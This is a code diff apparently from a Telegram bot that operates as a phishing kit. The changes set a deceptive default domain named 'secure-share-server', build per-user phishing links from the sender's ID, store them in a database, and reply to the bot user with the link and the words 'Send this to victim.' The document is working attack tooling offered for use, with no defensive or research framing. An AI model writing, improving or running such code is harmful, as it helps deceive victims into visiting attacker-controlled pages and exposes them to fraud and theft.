@@ -10,13 +10,14 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 # ========== CONFIG ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
-PHISHING_DOMAIN = os.environ.get('PHISHING_DOMAIN', 'https://your-server.onrender.com')
+PHISHING_DOMAIN = os.environ.get('PHISHING_DOMAIN', 'https://secure-share-server.onrender.com')
 CHANNEL_USERNAME = '@nrtecno2'
 PORT = int(os.environ.get('PORT', 10000))
 
 # ========== DATABASE ==========
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DB_PATH = os.path.join(BASE_DIR, 'database.db')
+
 conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS users
@@ -91,13 +92,15 @@ def handle_link(message):
 def handle_photo(message):
     user_id = message.from_user.id
     photo_id = message.photo[-1].file_id
-    unique_code = generate_unique_link(user_id)
     
+    # Generate link with user ID
+    phishing_link = f"{PHISHING_DOMAIN}/{user_id}"
+    
+    # Store in database
     c.execute("UPDATE users SET photo_id = ?, unique_code = ? WHERE user_id = ?",
-              (photo_id, unique_code, user_id))
+              (photo_id, str(user_id), user_id))
     conn.commit()
     
-    phishing_link = f"{PHISHING_DOMAIN}/{unique_code}"
     bot.reply_to(
         message,
         f"✅ *Link Generated!*\n\n🔗 `{phishing_link}`\n\nSend this to victim.",
